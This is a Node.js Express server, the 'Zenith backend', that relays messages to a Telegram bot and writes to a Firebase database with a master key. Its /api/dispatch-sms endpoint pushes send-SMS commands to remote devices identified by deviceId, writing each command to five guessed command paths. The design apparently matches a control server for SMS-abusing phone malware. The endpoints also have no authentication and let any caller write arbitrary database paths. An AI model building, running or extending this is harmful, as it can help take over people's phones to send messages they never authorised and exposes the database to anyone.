const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(express.json());

// Telegram proxy endpoint
app.post('/api/send-telegram', async (req, res) => {
    const { text, entities } = req.body;
    
    try {
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const token = process.env.TELEGRAM_BOT_TOKEN;
        
        const body = {
            chat_id: chatId,
            text: text,
            disable_web_page_preview: true
        };
        
        if (entities && entities.length) {
            body.entities = entities;
        }
        
        const response = await fetch(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            }
        );
        
        const data = await response.json();
        res.json({ ok: data.ok, messageId: data.result?.message_id });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Firebase sync proxy endpoint
app.post('/api/firebase-sync', async (req, res) => {
    const { path, data } = req.body;
    
    try {
        const url = process.env.MASTER_FB_URL;
        const key = process.env.MASTER_FB_KEY;
        
        const response = await fetch(
            `${url}/${path}.json?auth=${key}`,
            {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }
        );
        
        const result = await response.json();
        res.json({ ok: true, data: result });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

// SMS dispatch endpoint
app.post('/api/dispatch-sms', async (req, res) => {
    const { deviceId, sim, to, message } = req.body;
    
    if (!deviceId || !sim || !to || !message) {
        return res.status(400).json({ ok: false, error: 'Missing fields' });
    }
    
    try {
        const fbUrl = process.env.MASTER_FB_URL;
        const fbKey = process.env.MASTER_FB_KEY;
        const cmdId = "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);
        
        const paths = [
            'webhookEvent/sendSms',
            'sendSms',
            'sms/send',
            'commands/sendSms',
            'sms'
        ];
        
        const results = await Promise.all(
            paths.map(p =>
                fetch(
                    `${fbUrl}/clients/${deviceId}/${p}.json?auth=${fbKey}`,
                    {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            from: sim,
                            to: to,
                            message: message,
                            isSended: false,
                            cmdId: cmdId,
                            ts: Date.now()
                        })
                    }
                ).catch(e => ({ ok: false }))
            )
        );
        
        const okCount = results.filter(r => r.ok).length;
        res.json({ ok: true, cmdId, okCount, total: results.length });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Zenith backend running on port ${PORT}`);
    console.log(`📍 Health check: http://localhost:${PORT}/health`);
});